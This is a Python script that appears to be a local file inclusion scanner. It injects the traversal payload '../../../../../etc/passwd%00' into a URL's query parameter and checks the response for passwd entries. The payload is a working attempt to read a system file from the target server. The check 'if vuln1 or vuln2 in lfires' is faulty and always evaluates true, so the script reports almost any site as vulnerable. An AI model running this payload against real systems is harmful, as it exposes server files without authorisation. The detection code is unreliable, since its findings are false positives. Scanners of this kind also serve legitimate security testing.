from urllib.parse import urlparse
import sys
from requests.exceptions import MissingSchema, Timeout
from urllib.request import HTTPError
import urllib.request as urllib
import random
from bs4 import BeautifulSoup
import requests
import requests.exceptions
from urllib.parse import urlsplit
from collections import deque
import re
import os

printres={}
lfi_url = []


def scan_lfi(url1):
    #print("\n[+] Running LFI scan on",url)
    payld='../../../../../etc/passwd%00'
    vuln1='root:x:0:0:root:/root:/bin/bash'
    vuln2='mail:x:8:'
    #url=input("please enter the URL")
    scanurl=urlparse(url1)
    foundvln='[!] Local File Inclusion Vulnerability Found!!!'
    invalidurl='[-] Invalid URL!!!'
    error1='[-] The conection could not be established!!!'
    error2='[-] Request Timed out!!!'
    notfound='[-] Local File Inclusion Vulnerability NOT FOUND'
    #print(scanurl)

    if len(scanurl.path)==0:
        printres.update(LFI = "URL doesn't contain a script")
        return printres
    if len(scanurl.query)==0:
        printres.update(LFI = "The URL doesn't contain a query string")
        return printres
    #check for path and query
    parameters=dict([part.split('=') for part in scanurl[4].split('&')])
    #print(len(parameters))
    #if need for checking multiple params
    for index, item in enumerate(parameters):
        pass #print('')
    for key, value in parameters.items():
        if key==item:
            pass #print('')

    pld=item+'='+payld
    lfi11=''.join(scanurl[0:1])+'://'
    lfi22=''.join(scanurl[1:2])
    lfi33=''.join(scanurl[2:3])+'?'
    lfi44=''.join(pld)
    lfi14=lfi11+lfi22+lfi33+lfi44
    #print('The payload URL is - '+ lfi14)
    #print(lfi14)
    s=requests.Session()
    """try: 
        s=requests.Session()
        get_cook=s.post(lfi14)
        cookie={'PHPSESSID': requests.utils.dict_from_cookiejar(s.cookies)['PHPSESSID']}
    except KeyError:
        return notfound
        sys.exit(1)"""
    #print(cookie)
    user_agents=[ "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
              "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
              "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
              "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
              "Mozilla/3.01 (Macintosh; PPC)",
              "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
              "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
              "Opera/8.00 (Windows NT 5.1; U; en)",
              "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
    ]
    try:
        user_agent=random.choice(user_agents)
        HEaders={'User-Agent':user_agent}
        lfires=s.get(lfi14).text
        #print(lfires)
        if vuln1 or vuln2 in lfires:
            lfi_url.append(lfires)
            printres.update(LFI = 'Is Vulnerable')
            return printres
            #sys.exit(1)
    except HTTPError:
        printres.update(LFI = error1)
        #sys.exit(1)
        return printres
    #except Timeout as e:
    except requests.exceptions.Timeout as e:
        printres.update(LFI = error2)
        #print('Error Code:' +e)
        #sys.exit(1)
        return printres
    except MissingSchema as e:
        printres.update(LFI = invalidurl)
        #print('Error Code:'+ e)
        #sys.exit(1)
        return printres

    else:
        printres.update(LFI = 'Not Vulnerable')
        return printres

if __name__=="__main__":
    #url = input()
    url = str(sys.argv[1])
    printres=scan_lfi(url)
    if 'Is Vulnerable' in printres['LFI']:
        print(printres['LFI'],"GET:"+lfi_url[0])
    else:
        print(printres['LFI'],"GET:"+url)
